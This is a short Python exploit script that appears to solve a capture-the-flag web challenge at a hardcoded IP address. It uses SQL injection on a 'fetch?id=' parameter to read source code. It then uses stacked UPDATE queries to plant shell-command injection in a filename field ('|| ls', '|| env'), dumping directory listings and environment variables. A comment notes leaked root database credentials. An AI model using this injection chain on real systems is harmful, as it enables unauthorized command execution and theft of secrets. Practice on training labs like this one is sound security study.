#!/usr/bin/python3
from re import findall
from sys import argv

import requests

try :
	url = argv[1]

except:
	#print(f"Usage: {argv[0]} <url>")
	#exit(-1)
	url = "http://35.227.24.107/df82e9c592/"

def flag1():
	r = requests.get(url + "fetch?id=4+UNION+SELECT+'main.py'--")

	return findall(r"\^FLAG\^.*", r.text)[0]


#print(f"Flag0 -> {flag1()}")

#? info in the main.py
#* host="localhost", user="root", password="", db="level5"

def get_all_flag() -> list:
	requests.get(url + r"fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20ls%20./files%20%3Etemp.txt%20%27%20where%20id=3;%20commit;%20--")
	requests.get(url)
	requests.get(url + r"fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20env%20%3Etemp.txt%27%20where%20id=3;%20commit;%20-")
	requests.get(url)

	r = requests.get(url + r"fetch?id=4%20Union%20select%20%27temp.txt%27--")

	return findall(r"\^FLAG\^.*", r.text)[0]

flags = get_all_flag().split(',')
#print(flags)

for i in range(len(flags)):
	print("Flag{0} -> {1}" .format(i,flags[i].replace('"','').replace(' ','').replace(']','')))

#print(f"Flag1 -> ^FLAG^{flag2()}$FLAG$")